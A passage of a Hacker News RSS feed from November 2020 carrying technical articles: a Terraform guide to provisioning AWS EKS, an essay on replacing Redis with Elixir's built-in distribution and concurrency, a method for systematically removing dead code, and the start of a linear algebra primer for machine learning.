victor</a>, for instance.</p>
<p>Personally, I just want a safe environment for my friends and family. I think most of us do.</p>

</div>

</article></div>]]>
            </description>
            <link>https://austingwalters.com/public-safety-announcement-the-2020-election-is-not-over-as-of-nov-11-2020/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25059009</guid>
            <pubDate>Wed, 11 Nov 2020 15:14:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to setup EKS on AWS with Terraform]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25058923">thread link</a>) | @shuron
<br/>
November 11, 2020 | http://alexander.holbreich.org/eks-on-aws-with-terraform/ | <a href="https://web.archive.org/web/*/http://alexander.holbreich.org/eks-on-aws-with-terraform/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
    <article>

        

        <section>
            <p>After setup of several kubernetes clusters i would like to share how we do it. I hope this helps people to get start with <a href="http://alexander.holbreich.org/tag/k8n/">kubernetes</a>. But also im keen to read your feedback and improvement proposals.</p>

<h3 id="whyterraform">Why Terraform</h3>

<p>From time to to time i do explore <a href="http://alexander.holbreich.org/tag/terrafrom/">terraform</a>, in log term since it appearence (See my exploration on <a href="http://alexander.holbreich.org/aws-automation/">AWS automation</a>). Basically i think this tool (as many other from Hashicorp) just had right idea to the right time. Let me explain: The nature of the IT infrastructure is more or less static. No surprize, that declarative approach is very situative here. And here terraform creators seem to have clear vision on this when they evolve terraform language design and elaborated tooling around it. Terraformes has become favorit tool for cloud resources provisioning in many teams.</p>

<p>Meanwhile the concept of "state" finally evolved and found place in new hashicorp <em>terraform cloud</em> (with free tier for small or mid-size projects). It's very convinient and impoves teamworking. Btw. i'm not affilatet with Hashicorp.</p>

<h2 id="bootstraping">Bootstraping</h2>

<p>Ok, how do i start with it. Well I usually start with AWS Sub Account for the project. It makes sence anyway especially if there is no connection to other projects or parts of your systems. See <a href="https://docs.aws.amazon.com/organizations/latest/userguide/orgs_introduction.html">AWS Organization</a>. New Organization has at least one user whith enough rights. However for terraform i do addtional user 'terraform user' that has sufficient rights to create my enviroments. Basically i give him <code>AdministratorAccess</code></p>

<p>From this point on we can bootstrap terraform.  </p>

<h3 id="terrafomconfig">Terrafom config</h3>

<pre><code># See docu https://learn.hashicorp.com/tutorials/terraform/cloud-workspace-configure
provider "aws" {  
  region = "us-west-1" 
}

#https://www.terraform.io/docs/backends/types/remote.html
terraform {  
  backend "remote" {
    hostname = "app.terraform.io"
    organization = "YourOrga"

    workspaces {
      name = "your-aws-infa-workspace"
    }
  }
}
</code></pre>

<p>This is basically everything for bootstraping. </p>

<p>This setup assumes you have <code>aws-cli</code> installed and configured<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup> on your development Maschine, meaning  your local terraform executions are able to conntect to AWS API. <br>
Secondly it assumes that terraform state will be hostet and terrafor cloud: <code>backend "remote"</code> </p>

<p>Provided configuration changes your local terrafom workspace to be the remote one.  </p>

<p>To be more specific. The terraform cloud can be operated in two ways:</p>

<ol>
<li>Hosting only your terrafrom state</li>
<li>Hosting state but also be single point of the change and the hostory of that change (full remote operations)</li>
</ol>

<p>Here i'm talking about the second scenario, where <code>terraform apply</code> is only possibly from the cloud UI only. Please also keep in mind that, when using terraform cloud, the <code>terraform plan</code> and other commands will use variable values from the associated Terraform Cloud workspace. So it's TF-Cloud where you should configure access to you AWS account with the secret key of your terraform IAM user or role. </p>

<p>To summ this up: You need an account at: <strong><a href="https://app.terraform.io/">https://app.terraform.io</a></strong> <br>
And you're can enable team-members not only participate in commiting terraform code, but also for provisioning the infrastruture, without sharing and maintaning admin credentials to the AWS cloud.</p>

<p>Last step is to setup a Workspace and connect your git repository with it. Now you can provision the Infrastructure. <br>
At the end your terraform rund of <code>terraform plan</code> and <code>terraform apply</code> will look something like this: <br>
<img src="http://alexander.holbreich.org/content/images/2020/09/terraform_cloud.png" alt="">
and <br>
<img src="http://alexander.holbreich.org/content/images/2020/09/terraform_cloud2.png" alt=""></p>

<h3 id="provisioningnetwork">Provisioning Network</h3>

<pre><code># VPC for kubernetes and all other cluster related resources

resource "aws_vpc" "main" {  
  cidr_block           = "10.100.0.0/16"
  enable_dns_support   = true
  enable_dns_hostnames = true

  tags = {
    Name      = "main"
    managedby = "terraform"
  }
}
</code></pre>

<p>The subnets. The number of your Subnets should correspond to the number of AZ in the Region.</p>

<pre><code>## ==== Kubernetes subnets =====

#us-west-2a
resource "aws_subnet" "eks_a" {  
  vpc_id            = aws_vpc.main.id
  cidr_block        = "10.100.1.0/24"
  availability_zone = "us-west-2a"
  map_public_ip_on_launch = true

  tags = {
    managedby                                          = "terraform"
    Name                                               = "EKS, AZ a"
    "kubernetes.io/cluster/${local.cluster_name}"      = "shared"
    "kubernetes.io/role/elb"                           = "1"
    "kubernetes.io/role/internal-elb"                  = "1"
  }
}

#us-west-2b
resource "aws_subnet" "eks_b" {  
  vpc_id            = aws_vpc.main.id
  cidr_block        = "10.100.2.0/24"
  availability_zone = "us-west-2b"
  map_public_ip_on_launch = true

  tags = {
    managedby                                          = "terraform"
    Name                                               = "EKS, AZ b"
    "kubernetes.io/cluster/${local.cluster_name}" = "shared"
    "kubernetes.io/role/elb"                           = "1"
    "kubernetes.io/role/internal-elb"                  = "1"
  }
}

#us-west-2c
resource "aws_subnet" "eks_c" {  
  vpc_id            = aws_vpc.main.id
  cidr_block        = "10.100.3.0/24"
  availability_zone = "us-west-2c"
  map_public_ip_on_launch = true

  tags = {
    managedby                                          = "terraform"
    Name                                               = "EKS, AZ c"
    "kubernetes.io/cluster/${local.cluster_name}" = "shared"
    "kubernetes.io/role/elb"                           = "1"
    "kubernetes.io/role/internal-elb"                  = "1"
  }

}
</code></pre>

<p>This is pretty forward, for details consult Terraform Docu on <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/subnet">Resource: aws_subnet</a>, for the kubernetes cluster the provided tags are of interest. <br>
The tags are used by AWS EKS to understand where to put <a href="https://docs.aws.amazon.com/eks/latest/userguide/load-balancing.html">automatically requested LoadBalancers</a>. <br>
ESK requires <a href="https://docs.aws.amazon.com/eks/latest/userguide/network_reqs.html#vpc-subnet-tagging">special subnet tagging</a> <br>
<code>kubernetes.io/role/elb</code> with cluster name. The rest of it is up to you and not much pitfalls here except: <code>map_public_ip_on_launch = true</code>. This is needed because in this scenario i use <em>public sub-nets</em>. EKS Master nodes are managed by AWS and are deployed outside of my VPC while workers inside my VPC need to accessed their masters. So they need to have public IP addresses. The Fine grane access to the worker nodes is defined by Security Groups later. If it not suitable for you there is more defensive option to use private Workers with <em>private sub-nets</em> (not covered here).</p>

<p>Well and while we establihing the communication with Public Addresses, in the AWS universum we need the <em>Internet Gateway</em>.  </p>

<pre><code>resource "aws_internet_gateway" "igw1" {  
  vpc_id = aws_vpc.main.id

  tags = {
    Name = "main-igw1"
    managedby         = "terraform"
  }
}

resource "aws_route" "route_to_igw1" {  
  route_table_id            = "rtb-someId" #haven't found better way than hardcoding so far.
  destination_cidr_block    = "0.0.0.0/0"
  gateway_id                =  aws_internet_gateway.igw1.id

}
</code></pre>

<p><br>
With that basic networking is in place and it's time for kubernetes.</p>

<h2 id="theekscluster">The EKS Cluster</h2>

<p>We have good experinces with the <a href="https://registry.terraform.io/modules/terraform-aws-modules/eks/aws/">official Terraform EKS module</a>. <br>
Later versions of it utilize special <em>terraform kubernetes provider</em> for the provisioning of cluster Users and roles. So my examples show it. </p>

<pre><code>## 1 Cluster Module starts here.

module "eks_cluster" {  
  source                 = "terraform-aws-modules/eks/aws"
  version                = "12.2.0"
  cluster_name           = "${local.cluster_name}"
  cluster_version        = "1.17"
  subnets                = ["${aws_subnet.eks_a.id}", "${aws_subnet.eks_b.id}", "${aws_subnet.eks_c.id}"]
  vpc_id                 = "${aws_vpc.main.id}"
  cluster_create_timeout = "30m" # need to increase module defaults
  write_kubeconfig       = false # Disabled permanent writing of config files
  providers = {
    # Reference to kuberntes provider, see below
    kubernetes = kubernetes.eks_cluster
  }

  manage_aws_auth = true //TODO enable it https://github.com/terraform-aws-modules/terraform-aws-eks/issues/699

  node_groups_defaults = {
    ami_type  = "AL2_x86_64" #alternative is e.g. AL2_x86_64_GPU
    disk_size = 50
  }


  node_groups = {
    # EKS managed Nodes group with name prefix "ram"
    ram = {
      desired_capacity = 3
      max_capacity     = 10
      min_capacity     = 1

      public_ip = true

      instance_type = "r5.large"
      #Labels for nodes and tags
      k8s_labels = {
        node_type = "default"
      }
      # Resource tags are not labels
      additional_tags = {
        managedby   = "terraform"
      }
    }
  }

  #Users
  # Can be checked with: kubectl describe configmap -n kube-system aws-auth
  map_users = [
    {
      userarn  = "${aws_iam_user.my_addtionaluser.arn}"
      username = "${aws_iam_user.my_addtionaluser.name}"
      groups   = ["system:masters"]
    }
  ]

  tags = {
    managedby   = "terraform"
  }
}

## Configuration of kubernetes provides starts here
data "aws_eks_cluster" "eks-cluster" {  
  name = module.eks_cluster.cluster_id
}

data "aws_eks_cluster_auth" "eks-cluster" {  
  name = module.eks_cluster.cluster_id
}

provider "kubernetes" {  
  host                   = data.aws_eks_cluster.eks-cluster.endpoint
  cluster_ca_certificate = base64decode(data.aws_eks_cluster.eks-cluster.certificate_authority.0.data)
  token                  = data.aws_eks_cluster_auth.eks-cluster.token
  load_config_file       = false
  alias   = "eks_cluster"
  version = "~&gt; 1.10"
}
</code></pre>

<p>I think this the configuration is more or less self-explanatory. <br>
It starts with EKS module, that takes a list of agruments like version, list of users and List of node groups with Details to machines inside of such group. <br>
Also reference to kubernetes provider is present. <br>
The configuration is the kubernetes provider has to be placed here but is basically reference to the cluster. See EKS Modul documentation for Details.</p>

<h2 id="alternatives">Alternatives</h2>

<p>Of course there are alternatives and you can exchange any of the tools here. Meanwile the EKS has evolved (and got a bit simlier) and also terraform *nativ" Resource <a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/eks_cluster">eks_cluster</a> hase evolved. I'm interested in your experienced with it... …</p></section></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://alexander.holbreich.org/eks-on-aws-with-terraform/">http://alexander.holbreich.org/eks-on-aws-with-terraform/</a></em></p>]]>
            </description>
            <link>http://alexander.holbreich.org/eks-on-aws-with-terraform/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25058923</guid>
            <pubDate>Wed, 11 Nov 2020 15:03:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[You may not need Redis with Elixir]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25058805">thread link</a>) | @wojtekmach
<br/>
November 11, 2020 | https://dashbit.co/blog/you-may-not-need-redis-with-elixir | <a href="https://web.archive.org/web/*/https://dashbit.co/blog/you-may-not-need-redis-with-elixir">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <article>
    
<ul>
  <li>
    <i></i> José Valim
  </li>
  <li>
    <i></i> November 11th, 2020
  </li>
  <li>
    <i></i><a href="https://dashbit.co/blog/tags/redis">redis</a>, <a href="https://dashbit.co/blog/tags/phoenix">phoenix</a>, <a href="https://dashbit.co/blog/tags/pubsub">pubsub</a>, <a href="https://dashbit.co/blog/tags/processes">processes</a>
  </li>
</ul>
<p>
If you have participated in a discussion about Elixir, you may have heard “you may not need Redis with Elixir”. Given that Redis has many use cases, this sentence may confuse developers as they try to match Elixir’s different features against Redis’ capabilities. This article aims to explore different scenarios where the above is true, when they are not, and which trade-offs you may want to consider. We will discuss four cases:</p>
<ol>
  <li>
<a href="#post-pubsub">Distributed PubSub</a>  </li>
  <li>
<a href="#post-presence">Presence</a>  </li>
  <li>
<a href="#post-caching">Caching</a>  </li>
  <li>
<a href="#post-async">Asynchronous processing</a>  </li>
</ol>
<p>
Before we start, I want to emphasize we find Redis a fantastic piece of technology. This is not a critique of Redis but rather a discussion of the different options Elixir developers may have available.</p>
<h2 id="post-pubsub">
  Case #1: Distributed PubSub</h2>
<p>
The first scenario where you may not need Redis with Elixir is Distributed <a href="https://en.wikipedia.org/wiki/Publish%E2%80%93subscribe_pattern">PubSub</a>. Throughout this section, we will consider PubSub systems to provide <strong>at-most-once delivery</strong>: they broadcast events to the currently available subscribers. If a subscriber is not around, they won’t receive the message later.</p>
<p>
For this reason, PubSub systems are often paired with databases to offer persistence. For example, every time someone sends a message in a chat application, the system can save the contents to the database and then broadcast it to all users. This means everyone connected at a given moment sees the update immediately, but disconnected users can catch up later.</p>
<p>
Imagine that you have multiple nodes, and you want to exchange messages between said nodes. In Elixir, thanks to the Erlang VM, which ships with distribution support, this can be as simple as:</p>
<pre><code><span>for</span><span> </span><span>node</span><span> </span><span>&lt;-</span><span> </span><span>Node</span><span>.</span><span>list</span><span data-group-id="8737372369-1">(</span><span data-group-id="8737372369-1">)</span><span> </span><span data-group-id="8737372369-2">do</span><span>
  </span><span>send</span><span data-group-id="8737372369-3">(</span><span data-group-id="8737372369-4">{</span><span>:known_name</span><span>,</span><span> </span><span>node</span><span data-group-id="8737372369-4">}</span><span>,</span><span> </span><span>:hello_world</span><span data-group-id="8737372369-3">)</span><span>
</span><span data-group-id="8737372369-2">end</span></code></pre>
<p>
In <a href="https://github.com/phoenixframework/phoenix_pubsub/blob/master/lib/phoenix/pubsub.ex">200LOC or less</a>, you can implement a PubSub system that broadcasts to all subscribers within the same node or anywhere else in a cluster, without bringing any third-party tools. At best, you will need <a href="https://github.com/bitwalker/libcluster">libcluster</a> - an Elixir library - to establish the connection between the nodes based on some strategy (K8s, AWS, DNS, etc.).</p>
<p>
In other words, PubSub pretty much ships out of the box with Elixir. Technologies without distribution would need to rely on Redis PubSub, PostgreSQL Notifications, or similar to achieve the same.</p>
<p>
Of course, the above assumes your infrastructure allows you to directly establish connections between nodes, which may not be possible in some PaaS, such as Heroku. In those cases, you can use any of the technologies above (Phoenix <a href="https://dashbit.co/blog/github.com/phoenixframework/phoenix_pubsub_redis/">has a Redis adapter</a> for its PubSub), or alternatively use platforms, such as <a href="https://www.gigalixir.com/">Gigalixir</a>, that make it trivial to setup a cluster.</p>
<h2 id="post-presence">
  Case #2: Presence</h2>
<p>
Presence is the ability to track who is connected in a cluster right now — the “who” may be users, phones, IoT devices, etc. For example, if Alice is connected to node A, she wants to see that Bob is also available, even if he has joined node B.</p>
<p>
Presence is one of the problems that are more complicated to implement than it sounds. For example, let’s consider implementing Presence by storing the connected entities in a database. However, what happens if a node crashes or leaves the cluster? Because the node crashed, all the users connected to it must be removed, but the node itself cannot do so. Therefore the other nodes need to detect those failure scenarios and act accordingly. But observing failures in a distributed system is also complicated: how do you differentiate between a temporarily unresponsive node from one that permanently failed?</p>
<p>
Another common approach to solve this problem is to frequently write to a database while users are connected. If you have seen no writes within a timeframe, you consider those users to be disconnected. However, such solutions have to choose between being write-intensive or inaccurate. For instance, let’s say that users become disconnected after 1 minute. This means that you need to write to the database every 1 minute for every user. If you have 10k users, that’s 167 writes per second, only to track that the users are connected. Meanwhile, the gap between a user leaving and having their status reflected in the UI is, in the worst-case scenario, also 1 minute. Any attempt at reducing the number of writes implies an increased gap.</p>
<p>
Given Elixir’s clustering support, we can once more implement <a href="https://hexdocs.pm/phoenix/Phoenix.Presence.html">Presence</a> without a need for third-party dependencies! We use a PubSub system to implement Presence, as we need to notify as users join and leave. Instead of relying on centralized storage, the nodes directly communicate and exchange information about who is around. This removes the need for frequent writes. When a user leaves, this is also reflected immediately.</p>
<p>
So while you can use Redis or another storage to provide Presence, Elixir can deliver a solution that is efficient and doesn’t require third-party tools.</p>
<h2 id="post-caching">
  Case #3: Caching</h2>
<p>
The solutions to previous cases were built on top of Erlang’s unique distribution capabilities. In the following sections, the distinguishing factor between needing Redis or not will be <strong>multi-core concurrency</strong>, so this discussion is more generally applicable. Therefore, when we say Elixir in this section, it will also apply to JVM, Go, and other environments. They will contrast to Ruby, Python, and Node.js, in which their primary runtimes do not provide adequate multi-core concurrency within a single Operating System process.</p>
<p>
Let’s start with the non-concurrent scenario. Consider you are building a web application in Ruby, Python, etc. To deploy it, you get two eight-core machines. In languages that do not provide satisfactory multi-core concurrency, a common option for deployment is to start 8 instances of your web application, one per core, on each node. Overall, you will have CxN instances, where C is the number of cores, and N is the number of nodes.</p>
<p>
Now consider a particular operation in this application that is expensive, and you want to cache its results. The easiest solution, regardless of your programming environment, is to cache it in memory. However, given we have 16 instances of this application, caching it in memory is suboptimal: we will have to perform this expensive operation at least 16 times, one for each instance. For this reason, it is widespread to use Redis, Memcached, or similar for caching in environments like Ruby, Python, etc. With Redis, you would cache it only once, and it will be shared across all instances. The trade-off is that we are replacing memory access by a network round-trip, and the latter is orders of magnitude more expensive.</p>
<p>
Now let’s consider environments with multi-core concurrency. In languages like Elixir, you start one instance per node, regardless of the number of cores, since the runtime will share memory and efficiently spread the work across all cores. When it comes to caching, keeping the cache in-memory is a much more affordable scenario, as you will only have to compute once per node. Therefore, you have the <em>option</em> to skip Redis or Memcached altogether and avoid network round-trip.</p>
<p>
Of course, this depends on how many nodes you are effectively running in production. Luckily, many companies report being able to <a href="https://dev.to/erlangsolutions/why-elixir-is-the-programming-language-you-should-learn-in-2020-5g00">run Elixir with an order of magnitude less nodes</a> than technologies they have migrated from.</p>
<p>
You can also choose a mixed approach and store the cache both in-memory and in Redis. First, you look up in memory and, if missing, you fallback to Redis. If unavailable in both, then you execute the operation and cache it in each. The critical part to highlight here is that multi-core environments give you more flexibility to tackle these problems while reducing resource utilization. In Elixir/Erlang, you can also keep the cache in memory and use PubSub to distribute it across nodes. You can see this last approach in action <a href="https://github.com/tompave/fun_with_flags">in the excellent FunWithFlags library</a>.</p>
<p>
Another trade-off to consider is that all in-memory cache will be gone once you deploy new nodes. Therefore, if you need data to persist across deployments, you will want to use Redis as a cache layer, as detailed above, or dump the cache in a storage, such as database, S3, or Redis, before each deployment.</p>
<h2 id="post-async">
  Case #4: Asynchronous processing</h2>
<p>
Another scenario you may not need Redis in Elixir is to perform asynchronous processing. Let’s continue the discussion from the previous case.</p>
<p>
In environments without or with limited multi-core concurrency, given each instance is assigned to one core, they are limited in their ability to handle requests concurrently. This has led to a common saying that “you should avoid blocking the main thread”. For example, imagine that your application has to deliver emails on sign up or generate some computationally expensive reports. While one of your 16 web instances is doing this, it cannot handle other incoming requests efficiently. For this reason, a common choice here is to move the work elsewhere, typically a background-job processing queue. First, you store the work to be done on Redis or similar. Then one of the 16 web instances (or more commonly a completely different set of workers) grabs it from the queue.</p>
<p>
In multi-core concurrent environments, requests can be handled concurrently regardless if they are doing CPU or IO work. Sending the email from the request itself won’t block other requests. Generating the report is not a problem, as requests can be served by other CPUs. These platforms typically get assigned as many requests as they can handle and they distribute the work over the machine resources. Even if you prefer to deliver emails outside of the request, in order to send an earlier response to users, you can spawn an asynchronous worker without a need to move the delivery to an external queue or to another machine. Once again, concurrency gives us a more straightforward option to tackle these scenarios.</p>
<p>
Note the Erlang VM takes care of multiplexing CPU and IO work without a need for developers to tag functions as async or similar. Workers in Erlang/Elixir are …</p></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://dashbit.co/blog/you-may-not-need-redis-with-elixir">https://dashbit.co/blog/you-may-not-need-redis-with-elixir</a></em></p>]]>
            </description>
            <link>https://dashbit.co/blog/you-may-not-need-redis-with-elixir</link>
            <guid isPermaLink="false">hacker-news-small-sites-25058805</guid>
            <pubDate>Wed, 11 Nov 2020 14:48:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Systematically removing code]]>
            </title>
            <description>
<![CDATA[
Score 32 | Comments 45 (<a href="https://news.ycombinator.com/item?id=25058632">thread link</a>) | @jerodsanto
<br/>
November 11, 2020 | https://thepugautomatic.com/2020/11/systematically-removing-code/ | <a href="https://web.archive.org/web/*/https://thepugautomatic.com/2020/11/systematically-removing-code/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><hgroup><p><span>Written November 8, 2020. <span>Tagged <a href="https://thepugautomatic.com/tag/methodology">Methodology</a>.</span></span></p></hgroup><div><p>It's easy to miss things when removing code, leaving behind unused methods, templates, CSS classes or translation keys. (Especially in a dynamic language like Ruby, without a compiler to help you spot dead code.)</p><p>I avoid this by removing code systematically, line by line, depth-first.</p><p>This is one of those things that seems obvious when you do it, but in my experience, many people do it haphazardly.</p><p>Say we wanted to remove the "item box" from this page:</p><p>page.html.erb</p><pre><code><span><span><span>&lt;</span>p</span><span>&gt;</span></span>Welcome to my page!<span><span><span>&lt;/</span>p</span><span>&gt;</span></span><p><span><span>&lt;%=</span> render<span>(</span><span>"item_box"</span><span>,</span> item<span>:</span> item<span>)</span> <span>%&gt;</span></span></p></code></pre><p>_item_box.html.erb</p><pre><code><span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>box box--fancy<span>"</span></span><span>&gt;</span></span><br>  <span><span><span>&lt;</span>h2</span><span>&gt;</span></span><span><span>&lt;%=</span> item<span>.</span>title <span>%&gt;</span></span><span><span><span>&lt;/</span>h2</span><span>&gt;</span></span><br>  <span><span>&lt;%=</span> format_description<span>(</span>item<span>.</span>description<span>)</span> <span>%&gt;</span></span><br>  <span><span><span>&lt;</span>p</span><span>&gt;</span></span><span><span>&lt;%=</span> <span>I18n</span><span>.</span>translate<span>(</span><span>"my.translation.key"</span><span>)</span> <span>%&gt;</span></span><br><span><span><span>&lt;/</span>div</span><span>&gt;</span></span></code></pre><p>So our end goal is to remove the <code>&lt;%= render("item_box", item: item) %&gt;</code> line.</p><p>First, we search the project to check that <code>_item_box.html.erb</code> isn't used somewhere else, or referenced in docs that we'll need to update. It isn't, so we're OK to remove it – but before we do that, we must go through it line by line.</p><p>The first line is <code>&lt;div class="box box--fancy"&gt;</code>. So we search the project for these two CSS classes, checking if they're in use somewhere else. If not, we remove them from the CSS files.</p><p>We go deeper if required – perhaps the CSS for <code>.box--fancy</code> uses a CSS variable. Then we check if that variable is in use elsewhere. <a href="https://thepugautomatic.com/2014/03/stacked-vim-searches-down-cold/">Stacked searches in Vim</a> are helpful here.</p><p>Once we've checked a line in the file, we delete that line. This helps us keep track of what we've already checked.</p><p>So after we've checked and removed that line, we're left with</p><p>_item_box.html.erb</p><pre><code>  <span><span><span>&lt;</span>h2</span><span>&gt;</span></span><span><span>&lt;%=</span> item<span>.</span>title <span>%&gt;</span></span><span><span><span>&lt;/</span>h2</span><span>&gt;</span></span><br>  <span><span>&lt;%=</span> format_description<span>(</span>item<span>.</span>description<span>)</span> <span>%&gt;</span></span><br>  <span><span><span>&lt;</span>p</span><span>&gt;</span></span><span><span>&lt;%=</span> <span>I18n</span><span>.</span>translate<span>(</span><span>"my.translation.key"</span><span>)</span> <span>%&gt;</span></span><br><span><span><span>&lt;/</span>div</span><span>&gt;</span></span></code></pre><p>And we continue this way, line by line. Is the <code>item.title</code> used elsewhere? If not, we should probably remove it, too. What about <code>format_description</code>, <code>item.description</code>, the <code>my.translation.key</code> translation key?</p><p>Again, we go deeper if required, not removing the <code>format_description</code> method until we've gone through <em>it</em> line by line.</p><p>When we've looked at every line in <code>_item_box.html.erb</code> and deleted them as we went, the file will be empty, and we can start popping the stack.</p><p>We remove the empty <code>_item_box.html.erb</code> file.</p><p>And we can finally remove the <code>&lt;%= render("item_box", item: item) %&gt;</code> line, fairly confident that we didn't leave dead code behind.</p><p>This probably sounds more tedious than it is. It tends to be quick work, and you can take shortcuts – removing a swathe of lines that don't reference anything else, or that only call methods that you know are used elsewhere.</p></div></section></div><div><p>Content and design © <a href="https://henrik.nyh.se/">Henrik Nyh</a> (<a href="https://twitter.com/henrik">@henrik</a>). Code is under a <a href="http://en.wikipedia.org/wiki/MIT_License">MIT License</a> unless otherwise stated.</p><p>Pug art by <a href="https://johannaost.com/">Johanna Öst</a>; other graphics are under a <a href="http://creativecommons.org/licenses/by/3.0/">CC BY License</a>.</p><p>Powered by <a href="https://11ty.dev/">Eleventy</a>.</p></div></div>]]>
            </description>
            <link>https://thepugautomatic.com/2020/11/systematically-removing-code/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25058632</guid>
            <pubDate>Wed, 11 Nov 2020 14:26:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Introduction to Linear Algebra for Applied Machine Learning with Python]]>
            </title>
            <description>
<![CDATA[
Score 412 | Comments 52 (<a href="https://news.ycombinator.com/item?id=25058619">thread link</a>) | @Anon84
<br/>
November 11, 2020 | https://pabloinsente.github.io/intro-linear-algebra | <a href="https://web.archive.org/web/*/https://pabloinsente.github.io/intro-linear-algebra">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <section id="main_content">
        
<!-- https://docs.mathjax.org/en/latest/configuration.html#local-config-files -->




<article>
  <h2>Introduction to Linear Algebra for Applied Machine Learning with Python</h2>
  <time datetime="2020-05-26T00:00:00+00:00">26 May 2020</time>
  

  

<p>Linear algebra is to machine learning as flour to bakery: <strong>every machine learning model is based in linear algebra, as every cake is based in flour</strong>. It is not the only ingredient, of course. Machine learning models need vector calculus, probability, and optimization, as cakes need sugar, eggs, and butter. Applied machine learning, like bakery, is essentially about combining these mathematical ingredients in clever ways to create useful (tasty?) models.</p>

<p>This document contains <strong>introductory level linear algebra notes for applied machine learning</strong>. It is meant as a reference rather than a comprehensive review. If you ever get confused by matrix multiplication, don’t remember what was the $L_2$ norm, or the conditions for linear independence, this can serve as a quick reference. It also a good introduction for people that don’t need a deep understanding of linear algebra, but still want to learn about the fundamentals to read about machine learning or to use pre-packaged machine learning solutions. Further, it is a good source for people that learned linear algebra a while ago and need a refresher.</p>

<p>These notes are based in a series of (mostly) freely available textbooks, video lectures, and classes I’ve read, watched and taken in the past. If you want to obtain a deeper understanding or to find exercises for each topic, you may want to consult those sources directly.</p>

<p><strong>Free resources</strong>:</p>

<ul>
  <li><strong>Mathematics for Machine Learning</strong> by Deisenroth, Faisal, and Ong. 1st Ed. <a href="https://mml-book.github.io/">Book link</a>.</li>
  <li><strong>Introduction to Applied Linear Algebra</strong> by Boyd and Vandenberghe. 1sr Ed. <a href="http://vmls-book.stanford.edu/">Book link</a></li>
  <li><strong>Linear Algebra Ch. in Deep Learning</strong> by Goodfellow, Bengio, and Courville. 1st Ed. <a href="https://www.deeplearningbook.org/contents/linear_algebra.html">Chapter link</a>.</li>
  <li><strong>Linear Algebra Ch. in Dive into Deep Learning</strong> by Zhang, Lipton, Li, And Smola. <a href="https://d2l.ai/chapter_preliminaries/linear-algebra.html">Chapter link</a>.</li>
  <li><strong>Prof. Pavel Grinfeld’s Linear Algebra Lectures</strong> at Lemma. <a href="https://www.lem.ma/books/AIApowDnjlDDQrp-uOZVow/landing">Videos link</a>.</li>
  <li><strong>Prof. Gilbert Strang’s Linear Algebra Lectures</strong> at MIT. <a href="https://ocw.mit.edu/courses/mathematics/18-06-linear-algebra-spring-2010/video-lectures/">Videos link</a>.</li>
  <li><strong>Salman Khan’s Linear Algebra Lectures</strong> at Khan Academy. <a href="https://www.khanacademy.org/math/linear-algebra">Videos link</a>.</li>
  <li><strong>3blue1brown’s Linear Algebra Series</strong> at YouTube. <a href="https://www.youtube.com/playlist?list=PLZHQObOWTQDPD3MizzM2xVFitgF8hE_ab">Videos link</a>.</li>
</ul>

<p><strong>Not-free resources</strong>:</p>

<ul>
  <li><strong>Introduction to Linear Algebra</strong> by Gilbert Strang. 5th Ed. <a href="https://www.amazon.com/Introduction-Linear-Algebra-Gilbert-Strang/dp/0980232775">Book link</a>.</li>
  <li><strong>No Bullshit Guide to Linear Algebra</strong> by Ivan Savov. 2nd Ed. <a href="https://www.amazon.com/No-bullshit-guide-linear-algebra/dp/0992001021">Book Link</a>.</li>
</ul>

<p>I’ve consulted all these resources at one point or another. Pavel Grinfeld’s lectures are my absolute favorites. Salman Khan’s lectures are really good for absolute beginners (they are long though). The famous 3blue1brown series in linear algebra is delightful to watch and to get a solid high-level view of linear algebra.</p>

<p>If you have to pic one book, I’d pic <strong>Boyd’s and Vandenberghe’s Intro to applied linear algebra</strong>, as it is the most beginner friendly book on linear algebra I’ve encounter. Every aspect of the notation is clearly explained and pretty much all the key content for applied machine learning is covered. The Linear Algebra Chapter in Goodfellow et al is a nice and concise introduction, but it may require some previous exposure to linear algebra concepts. Deisenroth et all book is probably the best and most comprehensive source for linear algebra for machine learning I’ve found, although it assumes that you are good at reading math (and at math more generally). Savov’s book it’s also great for beginners but requires time to digest. Professor Strang lectures are great too but I won’t recommend it for absolute beginners.</p>

<p>I’ll do my best to keep notation consistent. Nevertheless, learning to adjust to changing or inconsistent notation is a useful skill, since most authors will use their own preferred notation, and everyone seems to think that its/his/her own notation is better.</p>

<p>To make everything more dynamic and practical, I’ll introduce bits of Python code to exemplify each mathematical operation (when possible) with <code>NumPy</code>, which is the facto standard package for scientific computing in Python.</p>

<p>Finally, keep in mind this is created by a non-mathematician for (mostly) non-mathematicians. I wrote this as if I were talking to myself or a dear friend, which explains why my writing is sometimes conversational and informal.</p>

<p>If you find any mistake in notes feel free to reach me out at pcaceres@wisc.edu and to https://pablocaceres.org/ so I can correct the issue.</p>



<p><strong>Note:</strong> <em>underlined sections</em> are the newest sections and/or corrected ones.</p>

<p><strong><a href="#preliminary-concepts">Preliminary concepts</a></strong>:</p>
<ul>
  <li><a href="#sets">Sets</a></li>
  <li><a href="#belonging-and-inclusion">Belonging and inclusion</a></li>
  <li><a href="#set-specification">Set specification</a></li>
  <li><a href="#ordered-pairs">Ordered pairs</a></li>
  <li><a href="#relations">Relations</a></li>
  <li><a href="#functions">Functions</a></li>
</ul>

<p><strong><a href="#vectors">Vectors</a></strong>:</p>
<ul>
